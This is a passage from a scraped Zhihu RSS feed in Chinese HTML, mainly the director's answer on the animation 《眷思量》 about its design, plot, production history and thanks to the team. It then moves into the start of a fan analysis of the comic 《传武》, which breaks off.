data-private-watermark-src=\"v2-1c650815dcc131c7be829a0c1e274405\"></p>\n<p><br></p>\n<p><img src=\"https://pic3.zhimg.com/v2-cae63ec4269943df6e1380bb2cc365b6_720w.jpg?rss\" data-rawwidth=\"1920\" data-rawheight=\"1078\" data-size=\"normal\" data-watermark=\"watermark\" data-original-src=\"v2-cae63ec4269943df6e1380bb2cc365b6\" data-watermark-src=\"v2-e4f2d01a29aec8cd9bfe0e6b9662b291\" data-private-watermark-src=\"v2-4ae27a63affc073a0b1e4bac32d99866\"></p>\n<p><br></p>\n<p><img src=\"https://pic4.zhimg.com/v2-dbbf57a8f020f6acd68af90893e0b2f0_720w.jpg?rss\" data-rawwidth=\"1911\" data-rawheight=\"1079\" data-size=\"normal\" data-watermark=\"watermark\" data-original-src=\"v2-dbbf57a8f020f6acd68af90893e0b2f0\" data-watermark-src=\"v2-edee37324a283a5c0e2f5a57f5ce4000\" data-private-watermark-src=\"v2-70c279043cea10a7b0f264597c13922e\"></p>\n<p>所以在创造这些角色的时候，我想通过塑造内在气质和外在形象结合的方式来诠释人物的真实感，再加上每场戏对光影的设计，赋予每个角色更立体的表达。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-4a2f9b2b5d08841c9ca665658fe584dd_720w.jpg?rss\" data-rawwidth=\"1920\" data-rawheight=\"1080\" data-size=\"normal\" data-watermark=\"watermark\" data-original-src=\"v2-4a2f9b2b5d08841c9ca665658fe584dd\" data-watermark-src=\"v2-71e4c8d6cc7e8e79f0bacb5a65039341\" data-private-watermark-src=\"v2-a1b13fbba49e999a9a19ad5ca6de5617\"></p>\n<p><br></p>\n<p><img src=\"https://pic3.zhimg.com/v2-27b87c91d50486c36925482b51a94992_720w.jpg?rss\" data-rawwidth=\"1920\" data-rawheight=\"1080\" data-size=\"normal\" data-watermark=\"watermark\" data-original-src=\"v2-27b87c91d50486c36925482b51a94992\" data-watermark-src=\"v2-3873bd9962c173fdf63d63a3447058f6\" data-private-watermark-src=\"v2-f6bb3d6e62039c388d427fadd54bbb7c\"></p>\n<p><br></p>\n<p><img src=\"https://pic4.zhimg.com/v2-68f84222b10d5bc3ece3e127e3bcd568_720w.jpg?rss\" data-rawwidth=\"1920\" data-rawheight=\"1080\" data-size=\"normal\" data-watermark=\"watermark\" data-original-src=\"v2-68f84222b10d5bc3ece3e127e3bcd568\" data-watermark-src=\"v2-0df87a04e07b76475e8ee56d0f050b16\" data-private-watermark-src=\"v2-6df8d2d7ce9c8d025ba92444b28c5e4b\"></p>\n<p><br></p>\n<p><img src=\"https://pic1.zhimg.com/v2-2916f20cb31f206abf8033c9887d811e_720w.jpg?rss\" data-rawwidth=\"1920\" data-rawheight=\"1080\" data-size=\"normal\" data-watermark=\"watermark\" data-original-src=\"v2-2916f20cb31f206abf8033c9887d811e\" data-watermark-src=\"v2-23239cf11c26303768da70b101342dec\" data-private-watermark-src=\"v2-04503e5b66f936e28388d83b1cd1b54b\"></p>\n<p>再比如关于场景的创意思路，眷思量这个故事我想表达的是一个富有东方美学的架空幻想故事，所以场景首先要体现出中式的美感和风骨，但又不是真正的现实朝代感，所以我在影片中就尝试建立了一种新中式美学的思路，让建筑既有古意，又不同于实际的古代建筑本身。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-6b13fc48e7e4576a2d78b86d197db2d6_720w.jpg?rss\" data-rawwidth=\"1920\" data-rawheight=\"1080\" data-size=\"normal\" data-watermark=\"watermark\" data-original-src=\"v2-6b13fc48e7e4576a2d78b86d197db2d6\" data-watermark-src=\"v2-73011cbc1ae854fe18485320291a26c8\" data-private-watermark-src=\"v2-fcbf8fc0d3466184b16f62b311337f2f\"></p>\n<p><br></p>\n<p><img src=\"https://pic4.zhimg.com/v2-0c61a2295d4e2bbdab6ffd5146cba6b8_720w.jpg?rss\" data-rawwidth=\"1920\" data-rawheight=\"1080\" data-size=\"normal\" data-watermark=\"watermark\" data-original-src=\"v2-0c61a2295d4e2bbdab6ffd5146cba6b8\" data-watermark-src=\"v2-f3f064cd38ee7cd5190bb2bf34c36180\" data-private-watermark-src=\"v2-29f719c39e8cb5067cdb8943581d1e36\"></p>\n<p><br></p>\n<p><img src=\"https://pic2.zhimg.com/v2-81086387d2ea9b766aac09562f49897b_720w.jpg?rss\" data-rawwidth=\"2000\" data-rawheight=\"1126\" data-size=\"normal\" data-watermark=\"watermark\" data-original-src=\"v2-81086387d2ea9b766aac09562f49897b\" data-watermark-src=\"v2-aa919ba8a640da6bbab3ea7fa0f598ee\" data-private-watermark-src=\"v2-e7e40f6d5f682c5ea4e2fef8e12b274b\"></p>\n<p>其中藏典阁和议事堂这两座岛上代表建筑都是带有这种思路的神迹建筑设计。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-357128375a3eca820ea100bd6d7b966a_720w.jpg?rss\" data-rawwidth=\"1923\" data-rawheight=\"1083\" data-size=\"normal\" data-watermark=\"watermark\" data-original-src=\"v2-357128375a3eca820ea100bd6d7b966a\" data-watermark-src=\"v2-4ab7423a46db12545f27e1ae94b68723\" data-private-watermark-src=\"v2-d56250ba4eb9825cff8e441a7700b5fb\"></p>\n<p><br></p>\n<p><img src=\"https://pic1.zhimg.com/v2-5dd6f33de1f94e7b026192004d94bfaa_720w.jpg?rss\" data-rawwidth=\"1840\" data-rawheight=\"1035\" data-size=\"normal\" data-watermark=\"watermark\" data-original-src=\"v2-5dd6f33de1f94e7b026192004d94bfaa\" data-watermark-src=\"v2-0944e487093eba1143b5dcd77c705d7b\" data-private-watermark-src=\"v2-529aee02f1729fe05927cadfa550f9ed\"></p>\n<p>以上这些，大家在播出的影片中如果能感受到一些我就很欣慰了。</p>\n<p>从播之前忐忑的想知道大家的反应，到上线后被迫忙的焦头烂额顾不上了解，再到如今制作的工作正逐渐收尾，开始陆续回应多方的关注和交流。也很感谢知乎这次邀请我来跟大家好好交流一下。我就借这次机会说明下关于剧本身我的一些初始想法吧。</p>\n<p>1，先说说关于《眷思量》的主线剧情。虽然我之前都说过，但可能很多人还是没有看到，于是刚好在大知乎也说下！</p>\n<p>在我心中，这是一部全员搞事业的剧，爱情是辅助，而且里面还有亲情和友情等美好的情感。所以并不会从事业番忽然变成纯恋爱番哦。想看恋爱的大家多多二创吧～我也很期待看到大家发挥～</p>\n<p>就像《柯南》主线是断案，《棋魂》主线是围棋，《眷思量》的主线是讲述岛上以男女主为代表视角的一群年轻人如何突破枷锁寻找心中自由的故事。且感情设置都是1V1，不分叉不开后宫，谢谢！</p>\n<p>可能因为我心里这些角色都很美，可以说是个全员美人的颜番了，谁让我是个会建模的终极颜狗呢=v=。。。。，这个优势不充分利用下我怎能甘心，于是我也尽量在把美感做到我想要的程度。以及后续还会有我心中其他类型的极品美帅酷的角色登场，当然，前提是如果能继续往下做的话。。。。。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-a4d5ca4a1ae6175cb2771cf061da5d8c_720w.jpg?rss\" data-rawwidth=\"960\" data-rawheight=\"840\" data-size=\"normal\" data-watermark=\"watermark\" data-original-src=\"v2-a4d5ca4a1ae6175cb2771cf061da5d8c\" data-watermark-src=\"v2-d88fbe8fff2a361485846edc1f7496a5\" data-private-watermark-src=\"v2-f36e55826343a98fbe73c7101cfd5676\"></p>\n<p><br></p>\n<p><img src=\"https://pic2.zhimg.com/v2-7704cd69e702c6cc14058cf30ee88b25_720w.jpg?rss\" data-rawwidth=\"960\" data-rawheight=\"889\" data-size=\"normal\" data-watermark=\"watermark\" data-original-src=\"v2-7704cd69e702c6cc14058cf30ee88b25\" data-watermark-src=\"v2-451bac8031e0b2480d229675568357d8\" data-private-watermark-src=\"v2-e1072c3a7f91f7bcd6615e5819d5d970\"></p>\n<p><br></p>\n<p><img src=\"https://pic1.zhimg.com/v2-4f231adc612eb9133c086851f7bcae2b_720w.jpg?rss\" data-rawwidth=\"960\" data-rawheight=\"669\" data-size=\"normal\" data-watermark=\"watermark\" data-original-src=\"v2-4f231adc612eb9133c086851f7bcae2b\" data-watermark-src=\"v2-5e3d36a7074e6493a34de6c6157b7c19\" data-private-watermark-src=\"v2-331d26fe60fa288d152dab8bf24d1a6a\"></p>\n<p><br></p>\n<p><img src=\"https://pic4.zhimg.com/v2-fc30fa01dc933529351b49a141d477ed_720w.jpg?rss\" data-rawwidth=\"960\" data-rawheight=\"552\" data-size=\"normal\" data-watermark=\"watermark\" data-original-src=\"v2-fc30fa01dc933529351b49a141d477ed\" data-watermark-src=\"v2-0584282a79d6362a9a69dbe3f19b1bb7\" data-private-watermark-src=\"v2-b88a0ab7f1c5e369d4ed22126f68d490\"></p>\n<p>所以大家看到漂亮角色可能都会有磕CP啊拉郎啊之类的想法，这我能理解，也拦不住，但希望大家和和气气快快乐乐地磕，圈地自萌，不要因此产生无谓的纷争。</p>\n<p><br></p>\n<p>2，关于某些观众可能误会这是一部大女主剧的问题，从19年到21年，我也是通过各种自己能接触到的渠道重申多次。思量这部剧不是大女主剧，男女主都是重要的表达视角。</p>\n<p>以及因为角色的制作先后顺序不同，所以露面的前后顺序也不一样。可能导致有了解不全的人误解了。在这里也说明一下。</p>\n<p>眷眷的每个角色对我来说都是独一无二的，对故事都很重要。他们的出场是服从剧情的安排，在正片里的出现都是为推动剧情的发展。</p>\n<p>而在主线故事之外，我也给某些角色写过专属番外，如果以后时机成熟，可以看大家诉求，再决定是否为某个角色量身打造番外篇。</p>\n<p>我做眷眷的初衷就是把我脑海里这个原型故事完整表达好，每个绝美的人物都塑造好，他们在其中都很优秀，有各自的作用。只要大家还喜欢看，只要公司能维持正向运转，我会尽我所能一直做下去直到大结局的。</p>\n<p>3，然后来聊聊思量初相见时期的故事吧，因为很多人是开播后才注意到有思量这部剧的，所以难免对此充满疑惑。</p>\n<p>眷思量开始启动之初，面临一个很现实很残酷的问题：这是一个原创作品，无IP支持，无成熟商业模式，各方都在观望，我必须拿出东西来说服更多的人来支持这个项目。</p>\n<p>所以我决定先做一个眷思量的概念PV，让别人能以最直观的方式看到我脑海里的东西。</p>\n<p>在选择PV出场角色的时候，我选择了奉眠。之所以选择眠眠有两个原因：</p>\n<p>      1，我之前微博提过，因为她是思量故事里，第一个以神族身份和形态登场的角色，其他角色第一季的时候都苦哈哈的在思量岛渡劫。只有眠眠初登场就一直持续着她神秘华丽高贵的样子。我觉得是个可以说明我思量整体视觉调性的角色。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-6b1f2d509d3cf7b07baacd493f42a042_720w.jpg?rss\" data-rawwidth=\"2048\" data-rawheight=\"1407\" data-size=\"normal\" data-watermark=\"watermark\" data-original-src=\"v2-6b1f2d509d3cf7b07baacd493f42a042\" data-watermark-src=\"v2-c3251d68533e541455a7e4c953412e8e\" data-private-watermark-src=\"v2-3692f8f0c94014bf0b2a90ec0c22e304\"></p>\n<p><br></p>\n<p><img src=\"https://pic1.zhimg.com/v2-63a9e5096431ab5e2042c5bcf6aaf148_720w.jpg?rss\" data-rawwidth=\"1784\" data-rawheight=\"1000\" data-size=\"normal\" data-watermark=\"watermark\" data-original-src=\"v2-63a9e5096431ab5e2042c5bcf6aaf148\" data-watermark-src=\"v2-f6e29f32b4c543dd226035622eb03b73\" data-private-watermark-src=\"v2-ae915d4b83dd2b60dd235bf074e0b5ee\"></p>\n<p>        2，主角在我开始动手做PV的当时，模型材质还没完全做完，但很多人着急看效果，项目已经不能等了。而且眠眠可以充分展示我们项目在模型方面的技术水平。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-146c920eb20052e6f86d5a626b3c1ee4_720w.jpg?rss\" data-rawwidth=\"1700\" data-rawheight=\"718\" data-size=\"normal\" data-watermark=\"watermark\" data-original-src=\"v2-146c920eb20052e6f86d5a626b3c1ee4\" data-watermark-src=\"v2-5670fa87e67affbafdf0840bb95939a8\" data-private-watermark-src=\"v2-dcf7b89d7b66f49a49e9f25012bf6899\"></p>\n<p><br></p>\n<p><img src=\"https://pic2.zhimg.com/v2-f07c110c438f59c5fb1eba0390ae124c_720w.jpg?rss\" data-rawwidth=\"1725\" data-rawheight=\"723\" data-size=\"normal\" data-watermark=\"watermark\" data-original-src=\"v2-f07c110c438f59c5fb1eba0390ae124c\" data-watermark-src=\"v2-1ba6a7d996edd81609a81e80b1621275\" data-private-watermark-src=\"v2-3c772aad271b608f8bb817aa6efd5968\"></p>\n<p>2019年3月，我们上线的第一支PV。这支PV在微博和B站皆获得了过百万的播放量，收获了热烈的反馈，增加了各方的信心，也让我有了足够的支持把思量这个项目继续下去。</p>\n<p>当然以上这只是我在做思量时遇到的无数难关之一，而直到此时，我也不知道能不能继续把思量做完。让大家完完整整看到这个故事。</p>\n<p>但不管如何，在眷思量小有成绩之际，在眷眷的制作层面来讲，我要感谢很多人~</p>\n<p><br></p>\n<p>首先是我们炎央文化可爱的小伙伴们！他们中很多人怀抱着对我的信任，已经陪我走过了三年四年的时间，每个人都对作品付出了大量的心血。炎央文化的主创团队是眷思量这个作品的创作核心。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-6f486ca8e6ff713dd92511e4c7a92879_720w.jpg?rss\" data-rawwidth=\"1619\" data-rawheight=\"1180\" data-size=\"normal\" data-watermark=\"watermark\" data-original-src=\"v2-6f486ca8e6ff713dd92511e4c7a92879\" data-watermark-src=\"v2-819ead9a42558832b7094143d7507b7a\" data-private-watermark-src=\"v2-b49b649c6d7976f0726b310c6ebeeea0\"></p>\n<p><br></p>\n<p><img src=\"https://pic3.zhimg.com/v2-5bdef594a4c58c8661cb0b29bd5e6a04_720w.jpg?rss\" data-rawwidth=\"1896\" data-rawheight=\"1711\" data-size=\"normal\" data-watermark=\"watermark\" data-original-src=\"v2-5bdef594a4c58c8661cb0b29bd5e6a04\" data-watermark-src=\"v2-982dc84b37739a70a30f01737f8febe2\" data-private-watermark-src=\"v2-e134fb6b7801c212f0803b7024e0f3de\"></p>\n<p><br></p>\n<p><img src=\"https://pic4.zhimg.com/v2-e4d03f5115799ebe9c0c641adec86f4c_720w.jpg?rss\" data-rawwidth=\"2135\" data-rawheight=\"859\" data-size=\"normal\" data-watermark=\"watermark\" data-original-src=\"v2-e4d03f5115799ebe9c0c641adec86f4c\" data-watermark-src=\"v2-1c95e1f1566877e9ae4e3b32d50cbb49\" data-private-watermark-src=\"v2-930ba25728c21932f2188fe405c0f61c\"></p>\n<p><br></p>\n<p><img src=\"https://pic3.zhimg.com/v2-97d907a0e33f845658f0869b51908a02_720w.jpg?rss\" data-rawwidth=\"1280\" data-rawheight=\"2555\" data-size=\"normal\" data-watermark=\"watermark\" data-original-src=\"v2-97d907a0e33f845658f0869b51908a02\" data-watermark-src=\"v2-82bdb1b8ed1cddefb2e13c892b34e778\" data-private-watermark-src=\"v2-f123969269bf113cbefc16bcf621e226\"></p>\n<p>编剧组的朋友陪我研究剧本，梳理原著内容逻辑，跨年时还开编剧会到深夜，讨论的乐此不疲。</p>\n<p>制片组的小可爱们细心梳思量每个制作环节的每个细节，事无巨细的盯紧各方面进度，奋战在进度第一线协调各公司，努力保证项目推进效率。</p>\n<p>美术组的小伙伴们配合我一遍遍出服饰构思图，只为接近最贴合原著的角色身份和设计思路。在我选定后又精心绘制服装拆解图，供中期的小伙伴能看明白创意细节才好执行成模型。</p>\n<p>分镜组的小伙伴们在我每次讲戏、分解镜头思路后都快速积极的调整串联，只为达到画面顺畅叙事清晰，让每个角色都有最合适的亮相和剧情情节空间展现他们的喜怒哀乐。</p>\n<p>执行导演们负责将每集每个镜头的各种细节想法事无巨细的还原实施到影片中。对镜头、动画、解算等串联把控都非常尽心尽力。对音乐音效的编排创意也都非常有独到见解。剪辑节奏把控也深得我心～</p>\n<p>还要特别感谢吾立方动画的诸位老铁们！！我和吾立方的胡总渊源颇深，一直是业内互相欣赏、守望相助的动画友人，终于在《少锦》时正式开启合作，并通过通力合作建立了更加深的了解和相互信任，深知他们是一个踏实、负责、专业的团队。因此做《眷思量》的时候，第一时间邀胡总一起合作。</p>\n<p>模型组的小伙伴经常陪我加班到深夜雕模型，我多次龟毛的调整要求他们都没有不耐烦，才让资产能有这样协同统一。</p>\n<p>动画组的小伙伴对我零零碎碎的小要求都尽心尽力完成好，让角色动作真的靠近我心里想的样子。</p>\n<p>灯光组的小伙伴对我们非番剧打光级别的要求和一堆反馈回去的灯光设计图，都有努力执行并且保质保量让人欣喜。</p>\n<p>合成组的小伙伴对素材整合协调，我知道一个特效镜头素材动辄十几个G或者几十个G的文件你们肯定很头痛，但从不跟我抱怨。</p>\n<p>我在工作中的确龟毛要求高，但吾立方各组的小伙伴们都在努力配合我协助完成眷思量的各种环节，真的很感谢吾立方对于炎央文化和眷眷的支持！</p>\n<p><img src=\"https://pic2.zhimg.com/v2-f4bf572a9192666641411d3857060570_720w.jpg?rss\" data-rawwidth=\"960\" data-rawheight=\"720\" data-size=\"normal\" data-watermark=\"watermark\" data-original-src=\"v2-f4bf572a9192666641411d3857060570\" data-watermark-src=\"v2-04742be326a8181420eba6076f81c898\" data-private-watermark-src=\"v2-3bb6ae9575e02cf6188a70967e765a87\"></p>\n<p><br></p>\n<p><img src=\"https://pic2.zhimg.com/v2-c770c22a82439216652d0d272a5a665c_720w.jpg?rss\" data-rawwidth=\"960\" data-rawheight=\"720\" data-size=\"normal\" data-watermark=\"watermark\" data-original-src=\"v2-c770c22a82439216652d0d272a5a665c\" data-watermark-src=\"v2-4ff178f6c958848b2b1cc96d4ef8f3ab\" data-private-watermark-src=\"v2-aaa352a3451a303d0b4ab30e8b4c92af\"></p>\n<p><br></p>\n<p><img src=\"https://pic3.zhimg.com/v2-30495d54466748b151ea26652f0c068e_720w.jpg?rss\" data-rawwidth=\"2054\" data-rawheight=\"843\" data-size=\"normal\" data-watermark=\"watermark\" data-original-src=\"v2-30495d54466748b151ea26652f0c068e\" data-watermark-src=\"v2-0d68eb763c066de06a752ac4de3bcccf\" data-private-watermark-src=\"v2-776252e9d69b84b76fa81345577a4017\"></p>\n<p>感谢我的特效指导老师！眷思量里开场及难度最高的特效是找了专门的动画电影特效团队几何二进制做的，他们的特效总监也是眷思量的特效总监郭老师。在电影《哪吒魔童降世》和《姜子牙》里他们都负责了难度最高的特效之一。我与郭老师是一见如故，顺利解决了很多特效难题！</p>\n<p><img src=\"https://pic1.zhimg.com/v2-a06787323c135c8c5a62bb6af81c4833_720w.jpg?rss\" data-rawwidth=\"960\" data-rawheight=\"697\" data-size=\"normal\" data-watermark=\"watermark\" data-original-src=\"v2-a06787323c135c8c5a62bb6af81c4833\" data-watermark-src=\"v2-27b7d17d4da244240ab5b3aba3f9999d\" data-private-watermark-src=\"v2-abbb24633ba9fad4ce864fc6fc473f27\"></p>\n<p>超级感谢我的配音导演姜SIR，作为光合积木的创始人，姜sir尽心尽力的帮我寻找最适合思量的声音。并出色的完成了整部剧配音的指导和设计，让我也从中学到了很多！不愧是我敬重的大神级业界前辈。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-868c5075e6b43d362aa83431df44995a_720w.jpg?rss\" data-rawwidth=\"960\" data-rawheight=\"940\" data-size=\"normal\" data-watermark=\"watermark\" data-original-src=\"v2-868c5075e6b43d362aa83431df44995a\" data-watermark-src=\"v2-bfcff05abfe409bc52bc5c56ee12fcde\" data-private-watermark-src=\"v2-245d8bafe870e2f2e542736efc9e972a\"></p>\n<p><br></p>\n<p><img src=\"https://pic3.zhimg.com/v2-351ea4be2c9e2113cc840c84decc2975_720w.jpg?rss\" data-rawwidth=\"960\" data-rawheight=\"720\" data-size=\"normal\" data-watermark=\"watermark\" data-original-src=\"v2-351ea4be2c9e2113cc840c84decc2975\" data-watermark-src=\"v2-e8489e53bda3a49ff6145c8b7f53b82d\" data-private-watermark-src=\"v2-6b1186366347b58451b970013cc40ea4\"></p>\n<p>感谢负责音乐制作的作曲家白鸟老师，和白鸟是多年的老朋友了，这次的合作非常和我心意，但把他折腾够呛～～作曲家先生非常敬业优秀的完成了整个OST的创作，每首曲子都描摹出了思量故事里的各种情景。再配上师妹刘美麟的绝美声线献唱，深得我心。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-4b791e1fa8fa1da856d8c276c0139ab5_720w.jpg?rss\" data-rawwidth=\"2000\" data-rawheight=\"1422\" data-size=\"normal\" data-watermark=\"watermark\" data-original-src=\"v2-4b791e1fa8fa1da856d8c276c0139ab5\" data-watermark-src=\"v2-8617ab2fc2982ac7e46e9c587ce30589\" data-private-watermark-src=\"v2-2573e841dd3f976097977772238deb31\"></p>\n<p>当然还有我可爱的量子们，感谢你们的等待。还有给我的贴心留言，支持在默默赶工的我，每次看到这些留言，我就又有赶工的动力。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-fd8eb4c688b8c0f3cc12ea61e166e61b_720w.jpg?rss\" data-rawwidth=\"1440\" data-rawheight=\"1080\" data-size=\"normal\" data-watermark=\"watermark\" data-original-src=\"v2-fd8eb4c688b8c0f3cc12ea61e166e61b\" data-watermark-src=\"v2-ad7f7fb0547e16e7745edbbba0bb62eb\" data-private-watermark-src=\"v2-d7ec33d7d8072c994bba379c12ba775b\"></p>\n<p>然后回到我的专业领域。 第一季我个人其实有不少不满意的地方。但因为时间限制和档期要求，从剧本到最后成片很多方面来不及深抠。而且开始做项目由于能调动的资源太少，且项目没有任何知名度和对人才的吸引力，所以各方面都找不到人帮忙，希望这个情况能在第二季及后续可能进行的大电影制作里根据预算情况逐步改善，争取后面能吸引到喜欢思量的能人加入，把项目做得更好吧。</p>\n<p>以及，不得不提的是，因为思量能不能一直做下去，跟每集播放量正相关，播放量的多少直接关系到后面集数平台宣推资源争取和下一季制作成本的洽谈，所以从现在来看，各方面真的是个未知数。。。我也只能做好我能做到的，其他方面就看造化啦。所以希望喜欢思量的小伙伴们能从通过各种官方渠道支持我们，这样我们才能收到相应收益把项目持续下去，不要去支持盗版TOT做动画真是很非常不易，原创动画更是无比艰难，请大家且看且珍惜~T--T。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-232ef6b5c1fddac649531711b33bad86_720w.jpg?rss\" data-rawwidth=\"1920\" data-rawheight=\"1080\" data-size=\"normal\" data-watermark=\"watermark\" data-original-src=\"v2-232ef6b5c1fddac649531711b33bad86\" data-watermark-src=\"v2-23289ef954bb02f19986dde23385b656\" data-private-watermark-src=\"v2-21727b90abf743de42539af321e7ce78\"></p>\n<p><br></p>\n<p><img src=\"https://pic2.zhimg.com/v2-dc16a07105de605bb33358e1050fab24_720w.jpg?rss\" data-rawwidth=\"1895\" data-rawheight=\"1083\" data-size=\"normal\" data-watermark=\"watermark\" data-original-src=\"v2-dc16a07105de605bb33358e1050fab24\" data-watermark-src=\"v2-d650246c828be010086a9c47f398392a\" data-private-watermark-src=\"v2-41fe2457cae80a674e181b91c963c64a\"></p>\n<p>最后，我想说的是，不管我能不能争取到继续做下去的资金和资源，都希望现在上线播出的这季作品可以让每个参与过眷思量的人，每个喜欢眷思量的小伙伴，都能说一句——值得！</p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/zhao-yu-qing-95-43?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">赵禹晴</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/470160388/answer/1983181215?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">15 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/266714288?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">为什么我们对过去的动画评价要比现在的好？</a><br><a href=\"http://www.zhihu.com/question/25531649?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">请评价贱鸡行事系列动画？</a><br>\n","link":"http://www.zhihu.com/question/470160388/answer/1983181215?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"如何评价国产漫画《传武》？","date":"2021-07-07 03:00:11","description":"\n<blockquote>\n<i><b>观前提醒：</b>1，本文是以《传武》漫画为基础做的简单猜想；不涉及具体细节，如果对个别人物或剧情感兴趣；希望大家关注原版漫画与官方信息；</i> <br><i>2，文中涉及的历史，神魔以及各门派的简介，都是仅在《传武》世界观的语境下，结合个人浅薄的认识做的片面介绍；带有一定的主观倾向，目的仅是为了更好的解释个人观点，希望大家不要在现实生活中对号入座；</i><br><i>3，文中出现的如：详情之类的字眼，目的是为了缩短篇幅，不代表观点一定正确；</i>\n</blockquote>\n<p><img src=\"https://pic1.zhimg.com/v2-c2221ef6c59fff3a021711c42f7e16b8_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"638\" data-rawheight=\"388\" data-watermark=\"watermark\" data-original-src=\"v2-c2221ef6c59fff3a021711c42f7e16b8\" data-watermark-src=\"v2-317cee823ac8be9d8a7d33b38a7b3ee5\" data-private-watermark-src=\"\"></p>\n<h2><i>目录</i></h2>\n<p><b><i>引子</i></b></p>\n<p><b><i>《传武》中的神话设定</i></b></p>\n<p><i>1.《西游记》观音小分队的细节</i></p>\n<p><i>2.《封神演义》红尘仙的世俗依靠</i></p>\n<p><i>3.《水浒传》故事背后的故事</i></p>\n<p><i>4.漫画背后的微缩历史</i></p>\n<p><b><i>《传武》中的山海经设定</i></b></p>\n<p><i>1.仁兽驺虞的变态之路</i></p>\n<p><i>2.雁门关外的火凤燎原</i></p>\n<p><i>3.青龙背负的四大灾星</i></p>\n<p><b><i>《传武》中的克苏鲁设定</i></b></p>\n<p><i>1.黄衣之王与他的黄沙眷属</i></p>\n<p><i>2.克苏鲁神话外的克苏鲁</i></p>\n<p><b><i>《传武》中的戏剧化设定</i></b></p>\n<p><i>1.二百年一轮的庄周梦蝶</i></p>\n<p><i>2.樊家的王之宝库</i></p>\n<p><i>3.六道轮回间的相生相克</i></p>\n<p><b><i>个人感想</i></b></p>\n<p><br></p>\n<hr>\n<p><br></p>\n<h2><b>引子</b></h2>\n<p>无论怎么评价，传武注定是一部难以简单概括的作品，这并不是说传武的故事太过复杂，而是从整体的阅读体验来说的；就我个人而言，我一共系统的阅读过三次《传武》；第一次是跟随连载，大概从第一部的白骨洞剧情线一直跟到现在，回过头来看，中间确实会有出现跳戏或者自以为读懂其实不然的情况出现；不过抛开当时对部分细节的错误理解，《传武》也是一部初体验非常爽快的漫画；</p>\n<p><img src=\"https://pic2.zhimg.com/v2-185a3830654f485e0640b2f94588cd66_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1158\" data-rawheight=\"386\" data-watermark=\"watermark\" data-original-src=\"v2-185a3830654f485e0640b2f94588cd66\" data-watermark-src=\"v2-821e062317d4f571c50fa31c25fd574a\" data-private-watermark-src=\"v2-5cb568a2186a5ebb92985600ffff268e\"></p>\n<p>第二次就是走的我个人的拉片流程，建立了Excel表格，对漫画中出现的所有的各大门派，各大势力，绝学，法器，红尘仙，山海种，天灾；都做了简单的归类整理，并标注每件事发生的相关剧情信息；这一次我得出的结论是：传武中的故事和架构是要比我想象的更加严谨合理的；剧情其实也并不是我一开始认为的纯线性平铺直叙；而是不同的线在一开始就交织并行了，虽说不上草蛇灰线，但确实处处有伏笔；所有中期出现的关键剧情其实回过头去看在早期也都有隐晦暗示，只不过之前的剧情发展太慢，导致这些优点并不够明显；</p>\n<p><img src=\"https://pic2.zhimg.com/v2-3974d99f264c5ae79766b95ad6a7bf66_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"720\" data-rawheight=\"294\" data-watermark=\"watermark\" data-original-src=\"v2-3974d99f264c5ae79766b95ad6a7bf66\" data-watermark-src=\"v2-f5ea0270470339ce7bd2757a535f66ff\" data-private-watermark-src=\"\"></p>\n<p>第三次是在QQ群看了星云老师七百多页的剧透之后，去对照之前自己做的那些整理，发现绝大多数是还是能够对上的，而一些之前百思不得其解的事情也得到了解答；就此我认为我对两部传武有了一个较为粗浅的认识；</p>\n<p><img src=\"https://pic4.zhimg.com/v2-cfcfb37aebebdf2b3702926f17d53ce9_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"988\" data-rawheight=\"394\" data-watermark=\"watermark\" data-original-src=\"v2-cfcfb37aebebdf2b3702926f17d53ce9\" data-watermark-src=\"v2-a0b00510ea514cc543d182180ebd4651\" data-private-watermark-src=\"\"></p>\n<h2>《传武》中的神话设定</h2>\n<p>传武中出现最多的，或者说给普通读者最多共鸣的，往往就是传武中出现的那些神话元素，这些元素包括但不限于小说《西游记》；《封神演义》以及《搜神记》《聊斋志异》等志怪小说；这些神话设定一方面丰富了《传武》中此方世界信仰的丰富程度，也在很大一方面降低了部分读者的阅读门槛；使得普通读者在遇到一些细节彩蛋时，也能感受到亲切；</p>\n<p><img src=\"https://pic3.zhimg.com/v2-73d78e8e239c0ad9b844a308b50f09f3_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"720\" data-rawheight=\"321\" data-watermark=\"watermark\" data-original-src=\"v2-73d78e8e239c0ad9b844a308b50f09f3\" data-watermark-src=\"v2-7801d622463f55458f49a8c9a0aa192c\" data-private-watermark-src=\"\"></p>\n<p><b>1.《西游记》观音小分队的细节</b></p>\n<p>传武中出现的神话设定首屈一指的就是小说《西游记》；由于《传武》中与山阴合作的降世神明都是上界的观音（慈航）选拔的，所以不可避免的这些出现的角色或多或少都和观音或者西游记有一定的联系；</p>\n<p><img 